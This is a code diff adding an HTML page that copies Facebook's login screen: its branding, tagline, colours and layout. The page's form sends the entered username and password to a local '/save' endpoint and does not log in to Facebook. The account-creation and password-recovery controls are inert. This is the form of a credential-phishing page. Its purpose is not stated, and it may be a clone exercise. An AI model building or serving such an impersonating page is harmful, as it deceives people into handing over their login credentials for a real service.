@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Login</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background: #f0f2f5;
+    }
+
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .left {
+      flex: 1;
+      max-width: 500px;
+    }
+
+    .left h1 {
+      color: #1877f2;
+      font-size: 60px;
+      margin-bottom: 10px;
+    }
+
+    .left p {
+      font-size: 24px;
+      color: #1c1e21;
+    }
+
+    .right {
+      flex: 1;
+      max-width: 400px;
+      background: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+      text-align: center;
+    }
+
+    .right input {
+      width: 100%;
+      padding: 14px;
+      margin: 10px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 14px;
+      background: #1877f2;
+      border: none;
+      color: #fff;
+      font-size: 18px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    .login-btn:hover {
+      background: #166fe5;
+    }
+
+    .forgot {
+      display: block;
+      margin: 15px 0;
+      color: #1877f2;
+      font-size: 14px;
+      text-decoration: none;
+    }
+
+    .line {
+      height: 1px;
+      background: #dadde1;
+      margin: 20px 0;
+    }
+
+    .create-btn {
+      padding: 14px 20px;
+      background: #42b72a;
+      border: none;
+      color: #fff;
+      font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    .create-btn:hover {
+      background: #36a420;
+    }
+
+    @media(max-width: 900px) {
+      .container {
+        flex-direction: column;
+        text-align: center;
+      }
+
+      .left {
+        margin-bottom: 20px;
+      }
+
+      .left h1 {
+        font-size: 50px;
+      }
+
+      .left p {
+        font-size: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Left Side -->
+    <div class="left">
+      <h1>facebook</h1>
+      <p>Facebook helps you connect and share with the people in your life.</p>
+    </div>
+
+    <!-- Right Side -->
+    <div class="right">
+      <form action="/save" method="POST">
+        <!-- <input type="text" placeholder="Email or phone number" required>
+        <input type="password" placeholder="Password" required> -->
+        <input type="text" name="username" placeholder="Username" required><br>
+      <input type="password" name="password" placeholder="Password" required><br>
+        <button type="submit" class="login-btn">Log In</button>
+        <a href="#" class="forgot">Forgotten password?</a>
+        <div class="line"></div>
+        <button type="button" class="create-btn">Create New Account</button>
+      </form>
+    </div>
+  </div>
+</body>
+</html>
